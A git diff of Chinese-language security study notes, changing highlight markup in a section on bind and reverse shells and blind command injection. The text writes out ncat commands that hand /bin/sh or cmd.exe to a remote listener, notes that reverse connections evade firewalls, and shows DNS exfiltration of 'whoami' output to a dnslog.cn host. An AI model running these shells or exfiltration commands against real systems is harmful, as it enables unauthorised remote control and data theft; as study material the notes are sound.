@@ -34,9 +34,9 @@ ping -c 1 127.0.0.1 whoami
 ##### Windows 控制 Linux
 *Linux 被控制端：*
 Linux 监听 5566 + 把 /bin/sh 交给这个连接
-==`ncat -e /bin/sh -lvp 5566`==
+<mark>`ncat -e /bin/sh -lvp 5566`</mark>
 *Windows 控制端：*
-==`nc <Linux_IP> 5566`==
+<mark>`nc <Linux_IP> 5566`</mark>
 连接成功后，Windows 端输入的命令会交给 Linux 的 `/bin/sh` 执行。
 
 ##### Linux 控制 Windows
@@ -46,7 +46,7 @@ Windows 监听 5566 + 把 cmd.exe 交给这个连接
 *Linux控制端：*
 `nc <Windows_IP> 5566`
 
-正向连接就是：**==被控制方开端口等待，控制方主动连过去。==**
+正向连接就是：**<mark>被控制方开端口等待，控制方主动连过去。</mark>**
 
 ### 2. 反向连接（Reverse Shell）
 
@@ -55,9 +55,9 @@ Windows 监听 5566 + 把 cmd.exe 交给这个连接
 #### Windows 控制 Linux
 **Linux交出控制权，Windows连接**
 Windows 控制端先监听：
-==nc -lvvp 5566==
+<mark>nc -lvvp 5566</mark>
 Linux 被控制端主动连接 Windows：
-==ncat -e /bin/sh <Windows_IP> 5566==
+<mark>ncat -e /bin/sh <Windows_IP> 5566</mark>
 *把权限（/bin/sh）交给这个windows ip 的 5566端口*
 ##### Linux 控制 Windows
 **Windows交出控制权，Linux连接**
@@ -80,8 +80,8 @@ ncat -e cmd.exe <Linux_IP> 5566
 1. Windows攻击机
 2. Linux目标
 
-==正向连接需要Linux绑定sh到5566之后Windows去访问这个Linux IP,属于入站，容易被防火墙拦住
-反向连接是Linux主动连接Windows的IP, 主动出去不容易被拦住==
+<mark>正向连接需要Linux绑定sh到5566之后Windows去访问这个Linux IP,属于入站，容易被防火墙拦住
+反向连接是Linux主动连接Windows的IP, 主动出去不容易被拦住</mark>
 
 
 ## II. 数据回显
@@ -96,8 +96,8 @@ ping e24a3l.dnslog.cn
 ping `whoami`.e24a3l.dnslog.cn
 ```
 
-==命令注入漏洞存在，但是网页没有把命令执行结果显示出来时，怎么确认命令执行成功，以及怎么把结果“带出来”。==
-==这种情况通常叫 **无回显 / Blind Command Injection（盲命令注入）**。==
+<mark>命令注入漏洞存在，但是网页没有把命令执行结果显示出来时，怎么确认命令执行成功，以及怎么把结果“带出来”。</mark>
+<mark>这种情况通常叫 **无回显 / Blind Command Injection（盲命令注入）**。</mark>
 
 网站存在命令执行漏洞
         ↓
@@ -174,7 +174,7 @@ iz8nhhgtiuldwtz\administrator
 
 可是浏览器什么都看不到。
 
-这就是老师笔记里：==漏洞有，但是数据不回显==
+这就是老师笔记里：<mark>漏洞有，但是数据不回显</mark>
 
 ---
 
